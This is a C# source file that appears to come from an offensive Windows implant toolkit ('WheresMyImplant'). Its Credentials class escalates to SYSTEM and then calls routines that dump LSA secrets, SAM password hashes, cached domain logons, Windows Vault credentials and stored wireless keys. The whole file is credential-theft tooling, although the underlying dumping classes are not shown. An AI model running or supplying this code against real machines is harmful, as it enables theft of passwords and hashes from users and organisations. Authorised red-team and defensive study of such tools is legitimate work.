using System;

using Tokenvator;

namespace WheresMyImplant
{
    public sealed class Credentials
    {
        //Checked
        public static void DumpLSA()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                LSASecrets lsaSecrets = new LSASecrets();
                lsaSecrets.DumpLSASecrets();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void DumpSAM()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                SAM sam = new SAM();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void DumpDomainCache()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                CacheDump cacheDump = new CacheDump();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void DumpVault()
        {
            try
            {
                Vault vault = new Vault();
                vault.EnumerateCredentials();

                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                vault = new Vault();
                vault.EnumerateCredentials();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void DumpVaultCLI()
        {
            try
            {
                VaultCLI vault = new VaultCLI();
                vault.EnumerateVaults();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }

        //Checked
        public static void WirelessPreSharedKey()
        {
            try
            {
                CheckPrivileges checkSystem = new CheckPrivileges();
                if (!checkSystem.GetSystem())
                {
                    Console.WriteLine("[-] GetSystem Failed");
                    return;
                }
                WirelessProfiles wp = new WirelessProfiles();
                wp.GetProfiles();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] {0}", ex.Message);
            }
        }
    }
}
